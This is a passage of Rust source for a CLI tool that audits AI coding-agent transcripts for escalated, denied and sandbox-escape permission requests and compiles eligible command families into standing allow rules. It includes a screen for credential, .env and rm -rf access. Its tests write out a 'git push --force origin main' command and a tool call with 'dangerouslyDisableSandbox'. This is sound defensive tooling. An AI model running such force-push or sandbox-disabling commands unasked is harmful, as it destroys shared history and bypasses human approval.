    // sandbox-escape retry, regardless of whether it ever produced an
    // errored tool_result -- an ask that was ACCEPTED never does, which is
    // exactly what made this whole class invisible before. Iterated over
    // `uses` directly (not the transcript a second time) since every
    // tool_use this session ever recorded is already collected there.
    for (id, used) in &uses {
        if !used.dangerously_disable_sandbox {
            continue;
        }
        let Some(raw) = &used.command else { continue };
        let Some(record) = correlate_safety_decision(log_records, session, raw, used.timestamp)
        else {
            continue;
        };
        // `deny` is already reported above (it always produces the errored
        // "Permission to use" tool_result); a silent `allow` (the gh
        // carve-out or an `escape_allow` match) generated no friction at
        // all and is not itself a request needing attention. Only `ask` is
        // new territory here.
        if record.verdict != "ask"
            || record.matched_pattern.as_deref() != Some("<sandbox: unsandboxed retry>")
        {
            continue;
        }
        let result = match results.get(id) {
            Some(false) => "escalated-accepted",
            Some(true) => "escalated-denied",
            None => "escalated-pending",
        };
        out.push(PermissionRequest {
            session: session.to_string(),
            raw: raw.clone(),
            family: family_of(raw),
            cause: "interactive sandbox-escape ask".to_string(),
            result: result.to_string(),
            reusable: is_reusable(raw),
            permission_mode: used.permission_mode.clone(),
            is_sidechain: used.is_sidechain,
        });
    }
    out
}

// ---------------------------------------------------------------------
// Grouping + report
// ---------------------------------------------------------------------

pub(crate) fn group_requests(requests: &[PermissionRequest]) -> Vec<FamilyGroup> {
    let mut order: Vec<String> = Vec::new();
    let mut by_family: HashMap<String, Vec<&PermissionRequest>> = HashMap::new();
    for request in requests {
        by_family
            .entry(request.family.clone())
            .or_insert_with(|| {
                order.push(request.family.clone());
                Vec::new()
            })
            .push(request);
    }
    let mut groups: Vec<FamilyGroup> = order
        .into_iter()
        .map(|family| {
            let members = &by_family[&family];
            let reusable = members.iter().all(|m| m.reusable);
            // Any member's raw command classifying as protected protects
            // the whole group -- a family that is SOMETIMES a destructive
            // shape (`git push origin x` alongside `git push --force origin
            // main`) must not be recommended a standing allow just because
            // its first-observed member looked routine.
            let protected = members.iter().any(|m| is_protected_family(&family, &m.raw));
            FamilyGroup {
                count: members.len(),
                reusable,
                sample: members[0].raw.clone(),
                cause: members[0].cause.clone(),
                recommendation: recommendation_for(&family, protected, reusable),
                protected,
                family,
            }
        })
        .collect();
    groups.sort_by(|a, b| b.count.cmp(&a.count).then_with(|| a.family.cmp(&b.family)));
    groups
}

/// Runs the extractor for `agent` over every transcript file in `files`,
/// tagging each request with its file stem as the session id.
pub fn audit_report(agent: AuditAgent, files: &[PathBuf]) -> AuditReport {
    // Issue #147: read once per call, not once per transcript file --
    // `extract_claude_requests` takes the slice rather than reading it
    // itself, keeping that function a pure fold over its two inputs. A
    // resolution failure (no state dir, e.g. `ZIRV_CTX_STATE_DIR` unset on
    // a machine with no platform state dir) degrades to an empty slice:
    // every claude request then falls back to its pre-#147 cause wording,
    // exactly the graceful-degradation contract `correlate_safety_decision`
    // callers already rely on.
    let log_records: Vec<SafetyDecisionRecord> = if matches!(agent, AuditAgent::Claude) {
        super::state::StateDir::resolve(&super::config::env_from_process())
            .map(|state| log::read_safety_decisions(&state))
            .unwrap_or_default()
    } else {
        Vec::new()
    };

    let mut requests = Vec::new();
    let mut scanned = 0usize;
    for path in files {
        let Ok(text) = std::fs::read_to_string(path) else {
            continue;
        };
        scanned += 1;
        let session = path
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or("unknown")
            .to_string();
        let mut found = match agent {
            AuditAgent::Codex => extract_codex_requests(&text, &session),
            AuditAgent::Claude => extract_claude_requests(&text, &session, &log_records),
        };
        requests.append(&mut found);
    }
    AuditReport {
        agent: agent.label(),
        sessions_scanned: scanned,
        total_requests: requests.len(),
        groups: group_requests(&requests),
        requests,
    }
}

/// `native_rules` is issue #147, design decision 7's conflict source
/// (`read_native_claude_rules`) -- empty for codex (no native-settings
/// analogue) and for every pre-#147 call site, so passing `&[]` reproduces
/// the exact old output byte for byte.
pub fn render_report(report: &AuditReport, native_rules: &[(String, &'static str)]) -> String {
    let mut out = String::new();
    out.push_str(&format!(
        "# Permission audit -- {} ({} sessions scanned, {} requests)\n\n",
        report.agent, report.sessions_scanned, report.total_requests
    ));
    if report.groups.is_empty() {
        out.push_str("No escalated or denied permission requests found.\n");
        return out;
    }
    for group in &report.groups {
        out.push_str(&format!(
            "## {} -- {} request(s), {}\n",
            group.family,
            group.count,
            if group.reusable {
                "reusable"
            } else {
                "NOT reusable"
            }
        ));
        out.push_str(&format!("- cause: {}\n", group.cause));
        out.push_str(&format!("- sample: `{}`\n", group.sample));
        out.push_str(&format!("- recommendation: {}\n", group.recommendation));
        if let Some(conflict) = native_conflict(native_rules, &group.sample) {
            out.push_str(&format!(
                "- WARNING: your own native claude rule {conflict} would still block or \
                 prompt on this family -- the recommendation above alone does not fix it\n"
            ));
        }
        out.push('\n');
    }
    out
}

// ---------------------------------------------------------------------
// CLI: `zirv ctx permissions audit`
// ---------------------------------------------------------------------

#[derive(Debug, clap::Args)]
pub struct PermissionsArgs {
    #[command(subcommand)]
    pub verb: PermissionsVerb,
}

#[derive(Debug, clap::Subcommand)]
pub enum PermissionsVerb {
    /// Audit recent transcripts for escalated/denied permission requests,
    /// grouped by normalized command family. Strictly read-only: never
    /// writes anything.
    Audit(AuditArgs),
    /// Run the same audit, then compile eligible (non-protected, reusable)
    /// families into standing `[safety] allow` approvals in the operator's
    /// `~/.zirv/ctx.toml`. Unlike `audit`, this writes -- see `run_compile`'s
    /// own doc comment.
    Compile(CompileArgs),
}

#[derive(Debug, clap::Args)]
pub struct AuditArgs {
    /// Which agent's transcripts to read.
    #[arg(long, value_enum, default_value = "codex")]
    pub agent: AuditAgent,
    /// How many of the most recently modified transcripts to sample.
    #[arg(long, default_value_t = 5)]
    pub sessions: usize,
    /// Print the report as JSON instead of the human-readable form.
    #[arg(long, default_value_t = false)]
    pub json: bool,
}

#[derive(Debug, clap::Args)]
pub struct CompileArgs {
    /// Which agent's transcripts to read.
    #[arg(long, value_enum, default_value = "codex")]
    pub agent: AuditAgent,
    /// How many of the most recently modified transcripts to sample.
    #[arg(long, default_value_t = 5)]
    pub sessions: usize,
    /// Print what would be written without touching
    /// `~/.zirv/ctx.toml`.
    #[arg(long, default_value_t = false)]
    pub dry_run: bool,
    /// Issue #147, `--agent claude` only: without this flag, repeated
    /// eligible sandbox-escape-ask families are PRINTED as a recommendation
    /// only. With it, they are additionally written to `[safety]
    /// escape_allow` in `~/.zirv/ctx.toml` -- the operator-only home layer,
    /// exactly like the ordinary `[safety] allow` compile above it. No
    /// effect for `--agent codex`, which has no sandbox-escape-retry
    /// concept.
    #[arg(long, default_value_t = false)]
    pub escape: bool,
}

fn transcripts_root(agent: AuditAgent) -> Option<PathBuf> {
    match agent {
        AuditAgent::Codex => crate::utils::home_dir()
            .ok()
            .map(|h| h.join(".codex").join("sessions")),
        AuditAgent::Claude => super::window::projects_root().ok(),
    }
}

/// Codex has no per-command permission-hook contract zirv can pin the way
/// claude's `PreToolUse` hook is (`safety.rs`'s own doc comment): a codex
/// launch never consults `[safety]` at all (`CodexAdapter::default_sandbox_
/// args`'s own `let _ = (sandbox, safety);`, and `policy_args` reads only
/// `[policy]`, never `[safety]`). So while `permissions compile` still
/// writes real `[safety] allow` entries for a codex audit -- they are the
/// honest record of what a codex session actually asked for, and claude
/// reads them -- those entries change nothing about how *codex itself*
/// launches. Printed on every codex `audit`/`compile` run (including the
/// default `--agent codex`, `AuditArgs`/`CompileArgs`'s own `default_value`)
/// so an operator does not read "compiled" as "codex now enforces this".
/// Upstream `exec_permission_approvals`/`request_permissions_tool` (a
/// per-command hook codex itself would consult) are still in development,
/// not yet something this codebase can pin against.
const CODEX_SAFETY_NO_OP_CAVEAT: &str = "caveat: compiled [safety] allow entries do not change codex's own launch posture -- \
     codex has no per-command approval hook zirv can pin (upstream exec_permission_approvals \
     / request_permissions_tool are still in development)";

pub fn run_audit<W: Write>(args: &AuditArgs, w: &mut W) -> CtxResult<i32> {
    let files = transcripts_root(args.agent)
        .map(|root| super::optimize::newest_transcripts(&root, args.sessions))
        .unwrap_or_default();
    let report = audit_report(args.agent, &files);
    if args.json {
        writeln!(
            w,
            "{}",
            serde_json::to_string_pretty(&report).unwrap_or_default()
        )?;
    } else {
        if args.agent == AuditAgent::Codex {
            writeln!(w, "{CODEX_SAFETY_NO_OP_CAVEAT}")?;
        }
        // Issue #147, design decision 7: claude only -- codex has no native
        // settings.json permission-rule analogue for this to conflict with.
        let native_rules = if matches!(args.agent, AuditAgent::Claude) {
            crate::utils::home_dir()
                .map(|home| {
                    read_native_claude_rules(&home, std::env::current_dir().ok().as_deref())
                })
                .unwrap_or_default()
        } else {
            Vec::new()
        };
        write!(w, "{}", render_report(&report, &native_rules))?;
    }
    Ok(0)
}

/// A family whose normalized key is a single token (just the program name,
/// no subcommand) is structurally too coarse to compile into a standing
/// allow: `family_of`'s own depth-1 fallback (`family_depth`) collapses
/// EVERY invocation of that program to one family regardless of what it was
/// actually told to do, so `python -c "<audited code>"` and a future `python
/// -c "<anything else>"` are the identical family -- a standing allow keyed
/// on it would authorize arbitrary future code, not just the one audited
/// invocation. Review round 1 (2026-08-26): the primary, purely structural
/// half of that fix, deliberately independent of [`is_protected_family`]'s
/// interpreter/shell program-name list below -- this refuses ANY single-word
/// family (an unlisted program, e.g. `tasklist`, included), not only the
/// ones that list happens to name.
fn is_family_too_generic(family: &str) -> bool {
    family.split(' ').filter(|t| !t.is_empty()).count() < 2
}

/// Human-readable reason `run_compile`'s summary prints next to a family
/// [`is_family_too_generic`] refused.
const TOO_GENERIC_REASON: &str =
    "family too generic to compile safely -- needs subcommand-level specificity";

/// The eligibility fold `run_compile` applies to one audit report's groups:
/// which family earns a standing-allow pattern (`"<family> *"`), which is
/// skipped as too generic, and which is skipped as protected.
///
/// A `FamilyGroup`'s cached `protected` field is never trusted alone: `is_
/// protected_family(&family, &sample)` is re-run independently for every
/// group here, so a group that reaches this function with a wrong or stale
/// `protected` value cannot smuggle a protected family into the returned
/// patterns.
///
/// Pure, and split out of `run_compile` purely for testability -- the same
/// reason `dash/mod.rs`'s own composer functions are split out of
/// `fulfill_spawn_request`.
fn compile_eligibility(groups: &[FamilyGroup]) -> (Vec<String>, Vec<String>, Vec<String>) {
    let mut eligible_patterns: Vec<String> = Vec::new();
    let mut skipped_protected: Vec<String> = Vec::new();
    let mut skipped_too_generic: Vec<String> = Vec::new();
    for group in groups {
        if is_family_too_generic(&group.family) {
            skipped_too_generic.push(group.family.clone());
            continue;
        }
        if group.protected || is_protected_family(&group.family, &group.sample) {
            skipped_protected.push(group.family.clone());
            continue;
        }
        if !group.reusable {
            continue;
        }
        eligible_patterns.push(format!("{} *", group.family));
    }
    (eligible_patterns, skipped_protected, skipped_too_generic)
}

/// Issue #147, design decision 6: the `--escape` eligibility fold, over the
/// AUDIT'S OWN `requests` (not `groups` -- a `FamilyGroup` folds away which
/// members were the sandbox-escape-ask ones at all, which is exactly the
/// filter this needs first). Eligibility: (1) the family has at least two
/// tokens ([`is_family_too_generic`], reused unchanged); (2) the family is
/// not protected ([`is_protected_family`]/`group.protected`, reused
/// unchanged -- git/publish/credential/install gating); (3) EVERY observed
/// command in the family clears `safety::command_fails_escape_screen`
/// (credential paths, `.env` access, an unbounded root-wide `find`, and
/// every ordinary built-in/operator `deny` verdict -- rm -rf included) --
/// reusing that one combinator rather than re-declaring any of those
/// patterns here. `codex` has no sandbox-escape-retry concept, so a codex
/// report's `requests` carries no `"interactive sandbox-escape ask"` cause
/// and this always returns three empty lists for it.
/// The sandbox-escape-ask subset of `requests`, grouped -- shared by
/// `escape_eligibility` (which family earns compiling) and `run_compile`
/// (which needs each eligible family's own `.sample` for the design
/// decision 7 native-conflict check), so "which requests count as a
/// sandbox-escape ask" is declared exactly once.
fn escape_ask_groups(requests: &[PermissionRequest]) -> Vec<FamilyGroup> {
    let escape_requests: Vec<PermissionRequest> = requests
        .iter()
        .filter(|r| r.cause == "interactive sandbox-escape ask")
        .cloned()
        .collect();
    group_requests(&escape_requests)
}

fn escape_eligibility(requests: &[PermissionRequest]) -> (Vec<String>, Vec<String>, Vec<String>) {
    let escape_requests: Vec<&PermissionRequest> = requests
        .iter()
        .filter(|r| r.cause == "interactive sandbox-escape ask")
        .collect();
    let groups = escape_ask_groups(requests);

    let mut eligible_patterns: Vec<String> = Vec::new();
    let mut skipped_protected: Vec<String> = Vec::new();
    let mut skipped_too_generic: Vec<String> = Vec::new();
    for group in &groups {
        if is_family_too_generic(&group.family) {
            skipped_too_generic.push(group.family.clone());
            continue;
        }
        if group.protected || is_protected_family(&group.family, &group.sample) {
            skipped_protected.push(group.family.clone());
            continue;
        }
        let fails_screen = escape_requests
            .iter()
            .filter(|r| r.family == group.family)
            .any(|r| command_fails_escape_screen(&r.raw));
        if fails_screen {
            skipped_protected.push(format!(
                "{} (an observed invocation fails the credential/root-scan/deny screen)",
                group.family
            ));
            continue;
        }
        eligible_patterns.push(format!("{} *", group.family));
    }
    (eligible_patterns, skipped_protected, skipped_too_generic)
}

/// The family a compiled pattern (`"<family> *"`) was derived from -- the
/// inverse of `compile_eligibility`/`escape_eligibility`'s own
/// `format!("{family} *")`, used only to look a pattern's sample command
/// back up for the design decision 7 native-conflict check.
fn family_of_pattern(pattern: &str) -> &str {
    pattern.strip_suffix(" *").unwrap_or(pattern)
}

/// Issue #132's residual: "compile operator-owned managed policy into
/// reusable approvals". Runs the identical audit pipeline `run_audit` does,
/// then writes every ELIGIBLE family (`compile_eligibility`: not too
/// generic, not protected, reusable) into `[safety] allow` in the operator's
/// home `~/.zirv/ctx.toml` -- never a repo layer (`safety.allow` is
/// `REPO_FORBIDDEN` for exactly this reason).
///
/// The written pattern is `"<family> *"` -- verified against `safety::
/// glob_match`'s own semantics (a pattern ending in `" *"` matches its own
/// bare prefix too, issue #106) to actually match the next equivalent
/// invocation, not just the one sample command in the report.
///
/// Review round 1 (2026-08-26), cross-process TOCTOU: this reads the current
/// `[safety] allow` contents, decides what to add, then writes -- if two
/// `compile` invocations (or a hand-edit) race between the read and the
/// write, the loser's own read is stale and its write could re-derive a
/// duplicate that `union_allow_patterns`' in-process dedupe never saw coming
/// from outside. Not fixed here (matches every other `set_home_ctx_toml_*`
/// writer's own no-file-locking contract) -- `zirv ctx permissions compile`
/// is an operator-invoked, infrequent command, not a hot path two processes
/// plausibly race on the way `exec.rs`'s heavy-worker gate's count-then-
/// register window is (see that gate's own comment).
pub fn run_compile<W: Write>(args: &CompileArgs, w: &mut W) -> CtxResult<i32> {
    let files = transcripts_root(args.agent)
        .map(|root| super::optimize::newest_transcripts(&root, args.sessions))
        .unwrap_or_default();
    let report = audit_report(args.agent, &files);

    let (eligible_patterns, skipped_protected, skipped_too_generic) =
        compile_eligibility(&report.groups);

    if args.agent == AuditAgent::Codex {
        writeln!(w, "{CODEX_SAFETY_NO_OP_CAVEAT}")?;
    }

    let home = crate::utils::home_dir()?;
    let existing = crate::commands::setup::read_home_safety_allow(&home).unwrap_or_default();
    let (added, duplicates) =
        crate::commands::setup::union_allow_patterns(&existing, &eligible_patterns);

    if !args.dry_run && !added.is_empty() {
        crate::commands::setup::union_home_safety_allow(&home, &eligible_patterns)?;
        writeln!(
            w,
            "note: rewriting ~/.zirv/ctx.toml loses any comments currently in the file \
             (existing values are preserved); the pre-write file was copied to ctx.toml.bak"
        )?;
    }

    // Issue #147, design decision 7: claude only -- codex has no native
    // settings.json permission-rule analogue for this to conflict with.
    let native_rules = if matches!(args.agent, AuditAgent::Claude) {
        read_native_claude_rules(&home, std::env::current_dir().ok().as_deref())
    } else {
        Vec::new()
    };
    let sample_of: HashMap<String, String> = report
        .groups
        .iter()
        .map(|g| (g.family.clone(), g.sample.clone()))
        .collect();

    write_compile_summary(
        w,
        &CompileSummary {
            dry_run: args.dry_run,
            added: &added,
            skipped_protected: &skipped_protected,
            skipped_too_generic: &skipped_too_generic,
            duplicates: &duplicates,
            native_rules: &native_rules,
            sample_of: &sample_of,
        },
    )?;

    // Issue #147, design decision 6: claude only -- codex has no
    // sandbox-escape-retry concept, so `escape_eligibility` always returns
    // three empty lists for it and this section would be a no-op anyway;
    // skipped outright rather than printing an empty section every time.
    if matches!(args.agent, AuditAgent::Claude) {
        let (escape_eligible, escape_skipped_protected, escape_skipped_too_generic) =
            escape_eligibility(&report.requests);
        let escape_existing =
            crate::commands::setup::read_home_safety_escape_allow(&home).unwrap_or_default();
        let (escape_added, escape_duplicates) =
            crate::commands::setup::union_allow_patterns(&escape_existing, &escape_eligible);

        if args.escape && !args.dry_run && !escape_added.is_empty() {
            crate::commands::setup::union_home_safety_escape_allow(&home, &escape_eligible)?;
            writeln!(
                w,
                "note: rewriting ~/.zirv/ctx.toml loses any comments currently in the file \
                 (existing values are preserved); the pre-write file was copied to ctx.toml.bak"
            )?;
        }

        let escape_sample_of: HashMap<String, String> = escape_ask_groups(&report.requests)
            .iter()
            .map(|g| (g.family.clone(), g.sample.clone()))
            .collect();

        write_escape_compile_summary(
            w,
            args.escape,
            &CompileSummary {
                dry_run: args.dry_run,
                added: &escape_added,
                skipped_protected: &escape_skipped_protected,
                skipped_too_generic: &escape_skipped_too_generic,
                duplicates: &escape_duplicates,
                native_rules: &native_rules,
                sample_of: &escape_sample_of,
            },
        )?;
    }
    Ok(0)
}

/// Issue #147, design decision 7's addition to both compile-summary
/// writers below: `native_rules`/`sample_of` let an `added`/`duplicates`
/// pattern be checked against the operator's own native claude rules and
/// annotated rather than silently presented as fixed (`sample_of` maps a
/// family -- not the full `"<family> *"` pattern -- to its representative
/// command). Bundled into one struct purely to keep both functions under
/// clippy's argument-count lint; both `native_rules`/`sample_of` are empty
/// for codex (and for every pre-#147 caller), reproducing old output
/// exactly.
struct CompileSummary<'a> {
    dry_run: bool,
    added: &'a [String],
    skipped_protected: &'a [String],
    skipped_too_generic: &'a [String],
    duplicates: &'a [String],
    native_rules: &'a [(String, &'static str)],
    sample_of: &'a HashMap<String, String>,
}

fn write_compile_summary<W: Write>(w: &mut W, summary: &CompileSummary<'_>) -> CtxResult<()> {
    writeln!(
        w,
        "# Permission compile{}\n",
        if summary.dry_run { " (dry run)" } else { "" }
    )?;
    if summary.added.is_empty() {
        writeln!(w, "added: (none)")?;
    } else {
        writeln!(w, "added:")?;
        for pattern in summary.added {
            writeln!(w, "  - {pattern}")?;
            let sample = summary
                .sample_of
                .get(family_of_pattern(pattern))
                .map(String::as_str);
            if let Some(conflict) = sample.and_then(|s| native_conflict(summary.native_rules, s)) {
                writeln!(
                    w,
                    "    WARNING: your own native claude rule {conflict} would still block or \
                     prompt on this family -- not actually fixed by this addition alone"
                )?;
            }
        }
    }
    if !summary.skipped_protected.is_empty() {
        writeln!(w, "skipped (protected):")?;
        for family in summary.skipped_protected {
            writeln!(w, "  - {family}")?;
        }
    }
    if !summary.skipped_too_generic.is_empty() {
        writeln!(w, "skipped (too generic):")?;
        for family in summary.skipped_too_generic {
            writeln!(w, "  - {family} -- {TOO_GENERIC_REASON}")?;
        }
    }
    if !summary.duplicates.is_empty() {
        writeln!(w, "skipped (duplicate, already in [safety] allow):")?;
        for pattern in summary.duplicates {
            writeln!(w, "  - {pattern}")?;
        }
    }
    writeln!(
        w,
        "\ntakes effect for new sessions; running sessions will show 'policy snapshot stale' \
         in `zirv ctx status` until relaunched"
    )?;
    Ok(())
}

/// Issue #147, design decision 6: the `--escape` section, printed
/// additionally (never instead of `write_compile_summary` above) whenever
/// `--agent claude` is compiled. Without `--escape`, `summary.added` is
/// always empty (nothing was written) and every eligible pattern still
/// appears under `would_add`, so the operator sees exactly what `--escape`
/// would do before opting in.
fn write_escape_compile_summary<W: Write>(
    w: &mut W,
    escape: bool,
    summary: &CompileSummary<'_>,
) -> CtxResult<()> {
    writeln!(
        w,
        "\n# Sandbox-escape compile{}\n",
        if !escape {
            " (preview only -- pass --escape to write to [safety] escape_allow)"
        } else if summary.dry_run {
            " (dry run)"
        } else {
            ""
        }
    )?;
    let heading = if escape { "added" } else { "would_add" };
    if summary.added.is_empty() {
        writeln!(w, "{heading}: (none)")?;
    } else {
        writeln!(w, "{heading}:")?;
        for pattern in summary.added {
            writeln!(w, "  - {pattern}")?;
            let sample = summary
                .sample_of
                .get(family_of_pattern(pattern))
                .map(String::as_str);
            if let Some(conflict) = sample.and_then(|s| native_conflict(summary.native_rules, s)) {
                writeln!(
                    w,
                    "    WARNING: your own native claude rule {conflict} would still block or \
                     prompt on this family -- not actually fixed by this addition alone"
                )?;
            }
        }
    }
    if !summary.skipped_protected.is_empty() {
        writeln!(
            w,
            "skipped (protected or fails the deny/credential/root-scan screen):"
        )?;
        for family in summary.skipped_protected {
            writeln!(w, "  - {family}")?;
        }
    }
    if !summary.skipped_too_generic.is_empty() {
        writeln!(w, "skipped (too generic):")?;
        for family in summary.skipped_too_generic {
            writeln!(w, "  - {family} -- {TOO_GENERIC_REASON}")?;
        }
    }
    if !summary.duplicates.is_empty() {
        writeln!(w, "skipped (duplicate, already in [safety] escape_allow):")?;
        for pattern in summary.duplicates {
            writeln!(w, "  - {pattern}")?;
        }
    }
    Ok(())
}

pub fn run<W: Write>(args: &PermissionsArgs, w: &mut W) -> CtxResult<i32> {
    match &args.verb {
        PermissionsVerb::Audit(a) => run_audit(a, w),
        PermissionsVerb::Compile(a) => run_compile(a, w),
    }
}

/// Shared with `optimize.rs`'s friction pass (issue #132: "surface the same
/// summary in setup/optimization output when approval noise exceeds a
/// documented threshold"): builds the audit for `agent` over `files` and
/// returns it only when the noise is worth interrupting the operator about.
pub fn noisy_audit(agent: AuditAgent, files: &[PathBuf]) -> Option<AuditReport> {
    let report = audit_report(agent, files);
    (report.total_requests > NOISE_FINDING_THRESHOLD).then_some(report)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    // -------------------------------------------------------------
    // family_of / is_reusable
    // -------------------------------------------------------------

    #[test]
    fn family_of_collapses_wrappers_to_the_underlying_command() {
        assert_eq!(family_of("gh issue create --title x"), "gh issue");
        assert_eq!(family_of("/bin/zsh -lc 'gh issue view 42'"), "gh issue");
        assert_eq!(
            family_of("env -u FOO zirv setup profile --repo ."),
            "zirv setup profile"
        );
        assert_eq!(
            family_of("cargo nextest run --no-fail-fast"),
            "cargo nextest"
        );
        assert_eq!(family_of("git fetch origin"), "git fetch");
        assert_eq!(family_of("curl https://example.com/health"), "curl");
    }

    #[test]
    fn family_of_treats_a_pipe_target_as_downstream_not_a_new_family() {
        assert_eq!(
            family_of("gh issue list --limit 5 | jq '.[].title'"),
            "gh issue"
        );
    }

    #[test]
    fn a_mixed_case_subcommand_family_stays_protected_end_to_end() {
        let raw = "DoCkEr RuN -it ubuntu bash";
        let family = family_of(raw);
        assert_eq!(family, "docker run");
        assert!(is_protected_family(&family, raw));
    }

    #[test]
    fn a_short_flag_value_is_reusable() {
        assert!(is_reusable("gh issue create --title x --label bug"));
        assert!(is_reusable("cargo nextest run --no-fail-fast"));
        assert!(is_reusable("zirv setup apply --repo ."));
    }

    #[test]
    fn a_long_literal_body_is_not_reusable() {
        let body = "x".repeat(200);
        let command = format!("gh issue create --title y --body \"{body}\"");
        assert!(!is_reusable(&command));
    }

    #[test]
    fn a_pipe_into_a_text_filter_is_not_reusable() {
        assert!(!is_reusable("gh issue list --limit 5 | jq '.[].title'"));
        assert!(!is_reusable("gh pr view 12 --json body | jq -r .body"));
    }

    /// 2026-08-25 review: `is_reusable` used to check only the BARE last
    /// pipe stage, so an `env`-decorated filter target slipped past the
    /// `jq`/`grep`/`awk`/`sed` check entirely and was misjudged reusable.
    #[test]
    fn a_decorated_pipe_filter_is_still_recognised_as_not_reusable() {
        assert!(!is_reusable(
            "gh issue list --limit 5 | env NO_COLOR=1 jq ."
        ));
    }

    // -------------------------------------------------------------
    // codex extractor
    // -------------------------------------------------------------

    #[test]
    fn codex_extracts_only_require_escalated_exec_requests() {
        let lines = [
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "call_id": "call_1",
                    "sandbox_permissions": "require_escalated",
                    "command": "gh issue create --title x --body-file /tmp/body.md"
                }
            })
            .to_string(),
            // Not escalated -- must be skipped.
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "call_id": "call_2",
                    "command": "cargo build"
                }
            })
            .to_string(),
            // Not an exec tool call -- must be skipped.
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "apply_patch",
                    "sandbox_permissions": "require_escalated",
                    "command": "echo hi"
                }
            })
            .to_string(),
        ];
        let text = lines.join("\n");
        let requests = extract_codex_requests(&text, "session-a");
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].family, "gh issue");
        assert_eq!(requests[0].result, "escalated");
        // A `--body-file` request has no long inline literal and no filter
        // pipe, so it IS reusable -- the not-reusable shapes are covered by
        // the fixture-driven tests below.
        assert!(requests[0].reusable);
    }

    #[test]
    fn codex_reads_a_command_array_and_a_json_encoded_input_string() {
        let array_line = serde_json::json!({
            "type": "response_item",
            "payload": {
                "type": "custom_tool_call",
                "name": "exec",
                "sandbox_permissions": "require_escalated",
                "command": ["bash", "-lc", "git push --force origin main"]
            }
        })
        .to_string();
        let requests = extract_codex_requests(&array_line, "s");
        assert_eq!(requests.len(), 1);
        assert!(requests[0].raw.contains("git push"));

        let encoded_input = serde_json::json!({
            "sandbox_permissions": "require_escalated",
            "command": "zirv ctx optimize --sessions 3"
        })
        .to_string();
        let input_line = serde_json::json!({
            "type": "response_item",
            "payload": {
                "type": "custom_tool_call",
                "name": "exec",
                "input": encoded_input
            }
        })
        .to_string();
        let requests = extract_codex_requests(&input_line, "s");
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].family, "zirv ctx optimize");
    }

    // -------------------------------------------------------------
    // claude extractor
    // -------------------------------------------------------------

    fn claude_denial_pair(id: &str, name: &str, command: Option<&str>) -> String {
        let input = match command {
            Some(c) => serde_json::json!({ "command": c }),
            None => serde_json::json!({}),
        };
        let use_line = serde_json::json!({
            "message": {
                "content": [{"type": "tool_use", "id": id, "name": name, "input": input}]
            }
        })
        .to_string();
        let result_line = serde_json::json!({
            "message": {
                "content": [{
                    "type": "tool_result",
                    "tool_use_id": id,
                    "is_error": true,
                    "content": [{"type": "text", "text": format!(
                        "Permission to use {name} has been denied because Claude Code is running in don't ask mode."
                    )}]
                }]
            }
        })
        .to_string();
        format!("{use_line}\n{result_line}")
    }

    #[test]
    fn claude_correlates_a_denial_with_its_tool_use_by_id() {
        let text = claude_denial_pair("toolu_1", "Bash", Some("zirv ctx status"));
        let requests = extract_claude_requests(&text, "session-b", &[]);
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].family, "zirv ctx status");
        assert_eq!(requests[0].result, "denied");
        assert!(requests[0].cause.contains("dontAsk"));
    }

    #[test]
    fn claude_ignores_a_successful_tool_result() {
        let use_line = serde_json::json!({
            "message": {"content": [{"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "echo hi"}}]}
        }).to_string();
        let ok_result = serde_json::json!({
            "message": {"content": [{"type": "tool_result", "tool_use_id": "t1", "content": "hi"}]}
        })
        .to_string();
        let text = format!("{use_line}\n{ok_result}");
        assert!(extract_claude_requests(&text, "s", &[]).is_empty());
    }

    #[test]
    fn claude_ignores_an_error_that_is_not_a_permission_denial() {
        let use_line = serde_json::json!({
            "message": {"content": [{"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "false"}}]}
        }).to_string();
        let err_result = serde_json::json!({
            "message": {"content": [{"type": "tool_result", "tool_use_id": "t1", "is_error": true, "content": [{"type": "text", "text": "command exited 1"}]}]}
        }).to_string();
        let text = format!("{use_line}\n{err_result}");
        assert!(extract_claude_requests(&text, "s", &[]).is_empty());
    }

    #[test]
    fn claude_non_bash_tools_report_the_tool_name_as_family() {
        let text = claude_denial_pair("toolu_2", "Read", None);
        let requests = extract_claude_requests(&text, "s", &[]);
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].family, "Read");
        // Non-Bash denials have no command-shaped payload to judge for
        // reusability, so they default to reusable (the whole TOOL, not one
        // invocation of it, is what a policy change would grant).
        assert!(requests[0].reusable);
    }

    // -------------------------------------------------------------
    // Issue #147, design decision 5: safety-decision log correlation
    // -------------------------------------------------------------

    fn safety_decision_record(
        session: &str,
        command: &str,
        verdict: &str,
        matched_pattern: Option<&str>,
        ts: u64,
    ) -> SafetyDecisionRecord {
        SafetyDecisionRecord {
            ts,
            session: session.to_string(),
            mode: "interactive".to_string(),
            verdict: verdict.to_string(),
            command_sha256: sha256_hex(command.trim().as_bytes()),
            matched_pattern: matched_pattern.map(str::to_string),
        }
    }

    /// A dangerously-disable-sandbox retry with a timestamp, so
    /// `correlate_safety_decision` has something to join against.
    fn sandbox_escape_tool_use(
        id: &str,
        command: &str,
        timestamp: &str,
        permission_mode: Option<&str>,
        is_sidechain: bool,
    ) -> String {
        serde_json::json!({
            "type": "assistant",
            "timestamp": timestamp,
            "isSidechain": is_sidechain,
            "permissionMode": permission_mode,
            "message": {
                "content": [{
                    "type": "tool_use",
                    "id": id,
                    "name": "Bash",
                    "input": {"command": command, "dangerouslyDisableSandbox": true}
                }]
            }
        })
        .to_string()
    }

    fn tool_result_line(id: &str, is_error: bool, text: &str) -> String {
        let mut content = serde_json::json!({"tool_use_id": id, "type": "tool_result"});
        if is_error {
            content["is_error"] = serde_json::json!(true);
        }
        content["content"] = serde_json::json!([{"type": "text", "text": text}]);
        serde_json::json!({"message": {"content": [content]}}).to_string()
    }

    /// Correlated headless deny: the errored "Permission to use" tool_result
    /// still gets reported (unchanged), but the cause now names the actual
    /// hook reason instead of the generic pre-#147 wording.
    #[test]
